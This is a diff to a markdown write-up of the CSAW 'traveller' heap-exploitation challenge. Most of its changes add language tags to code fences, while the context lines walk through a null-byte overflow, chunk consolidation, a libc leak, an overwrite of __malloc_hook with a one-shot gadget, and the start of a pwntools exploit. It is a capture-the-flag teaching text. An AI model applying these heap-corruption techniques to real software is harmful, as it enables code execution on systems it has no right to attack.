@@ -2,7 +2,7 @@
 
 Let's take a look at the binary and libc:
 
-```
+```console
 $    file traveller
 traveller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b551cbb805a21e18393c3816ffd28dfb11b1ff1e, with debug_info, not stripped
 $    pwn checksec traveller
@@ -47,7 +47,7 @@ So looking at this, we are dealing with a `64` bit binary with `NX`. We can see 
 
 When we take a look at the `main` function in Ghidra, we see this:
 
-```
+```c
 int main(int argc)
 
 {
@@ -93,7 +93,7 @@ int main(int argc)
 
 So it is essentially just a menu, allowing us to `add`, `change`, `delete`, and `check` (also we get a stack infoleak):
 
-```
+```c
 void add(void)
 
 {
@@ -177,7 +177,7 @@ void add(void)
 
 So for the `add` function, it prompts us for a chunk size of either `0x80/0x110/0x128/0x150/0x200`. However this isn't the only chunk that is malloced. There is a `0x10` chunk, which contains a ptr to the new chunk, and the size. This ptr is stored in the bss variable `trips`, with the count for the number of chunks being stored in `tIndex`. In addition to that, it allows us to scan in data into the chunk whose size we have some control over. We can see that the heap structure looks like this:
 
-```
+```text
 0x0:    ptr to trip chunk
 0x8:    size of trip chunk
 
@@ -186,7 +186,7 @@ trip chunk
 
 Next up we have `change`:
 
-```
+```c
 void change(void)
 
 {
@@ -215,14 +215,14 @@ void change(void)
 
 So we can see that it allows us to specify an index to `trips`, and scan in data into the trip chunk for that index. We can see that there are two bugs here. It checks to make sure that the index we provide is not larger than `tIndex` (the count of the number of trip chunks), however there is nothing stopping us from picking an index like `-5` and referencing something before the start of the ptr array. This index check bug we see in a few different places throughout this binary, however I didn't really use it. The second bug we can see is a null byte overflow:
 
-```
+```c
     bytesRead = read(0,ptr->destination,ptr->distance);
     ptr->destination[bytesRead] = '\0';
 ```
 
 Next up we have the `delte` function:
 
-```
+```c
 void delete(void)
 
 {
@@ -253,7 +253,7 @@ void delete(void)
 
 So we can see that it frees both of the chunks. It also does the same index check, so it is also vulnerable to the same index check bug.
 
-```
+```c
 void check(void)
 
 {
@@ -284,7 +284,7 @@ So we have a null byte overflow bug. We will leverage this to cause heap consoli
 
 The first problem we have to deal with is that by the `0x10` chunks are allocated right next to our trip chunks:
 
-```
+```gdb
 gef➤  x/50g  0x603820
 0x603820:    0x0    0x21
 0x603830:    0x603850    0x80
@@ -315,7 +315,7 @@ gef➤  x/50g  0x603820
 
 We can get around this by allocating like `4` chunks, then freeing them. That way the `0x10` size chunks will get inserted into the fastbin and reused, so we will be able to get our trip chunks to align right next to each other. Now let's walk through and see how the memory is corrupted to give us a shell. Next we allocate four chunks that are right next to each other:
 
-```
+```gdb
 gef➤  x/150g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x3030303030303030    0xa
@@ -378,7 +378,7 @@ gef➤  x/150g 0x235b650
 
 So we can see our four chunks. We will start off by freeing the first one:
 
-```
+```text
 0x235b650:    0x0    0x121
 0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
 0x235b670:    0x0    0x0
@@ -458,7 +458,7 @@ So we can see our four chunks. We will start off by freeing the first one:
 
 Now that the first one has been freed, we will edit the second chunk to overflow the least significant byte of the third chunk with a null byte. This will change it's size from `0x121` to `0x100`. We will also set the previous size to `0x250`, so it thinks that the previous chunk started where our first chunk is:
 
-```
+```gdb
 gef➤  x/150g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
@@ -539,7 +539,7 @@ gef➤  x/150g 0x235b650
 
 Now there is a slight problem with what we have done. The size of the third chunk is now `0x100`. It will expect a new chunk at `0x235b8a0 + 0x100 = 0x235b9a0` (since we have allocated another chunk after this). So it will expect another chunk at `0x235b9a0`, that fills up the rest of the space to the top chunk. We can satisfy this by making a fake chunk there with a size of `0x231` since `0x235b9a0 + 0x230 = 0x235bbd0`, which we can see is where the top chunk is:
 
-```
+```gdb
 gef➤  x/200g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x7fbb12b01b78    0x7fbb12b01b78
@@ -645,7 +645,7 @@ gef➤  x/200g 0x235b650
 
 Now for the next step, we will cause the consolidation by freeing the third chunk here. After that we can just allocate a `0x110` byte chunk, which will bring the start of the unsorted bin up to our second chunk which we scan still write to (and we can print the data from it, and get a libc infoleak):
 
-```
+```gdb
 gef➤  x/200g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x3434343434343434    0x7fbb12b0000a
@@ -751,7 +751,7 @@ gef➤  x/200g 0x235b650
 
 Next we will allocate chunks, until we have one of those `0x10` chunks overlapping with our second chunk:
 
-```
+```gdb
 gef➤  x/150g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x3434343434343434    0x7fbb12b0000a
@@ -832,7 +832,7 @@ gef➤  x/150g 0x235b650
 
 Now that we have an `0x10` byte chunk overlapping with the second chunk, we will overwrite the ptr in it to point to the malloc hook:
 
-```
+```gdb
 gef➤  x/150g 0x235b650
 0x235b650:    0x0    0x121
 0x235b660:    0x3434343434343434    0x7fbb12b0000a
@@ -915,7 +915,7 @@ gef➤  x/g 0x7fbb12b01b10
 
 Now we can just overwrite the malloc hook with a oneshot gadget:
 
-```
+```gdb
 gef➤  x/g 0x7fbb12b01b10
 0x7fbb12b01b10 <__malloc_hook>:    0x7fbb1282e147
 ```
@@ -926,7 +926,7 @@ After that, it is just a matter of calling `malloc` and getting a shell!
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 from pwn import *
 
 #target = remote("pwn.chal.csaw.io", 1003)
@@ -1073,7 +1073,7 @@ target.interactive()
 
 When we run it (this exploit was ran on `Ubuntu 16.04`):
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './traveller': pid 15765
 [*] '/home/guyinatuxedo/Desktop/traveler/libc-2.23.so'
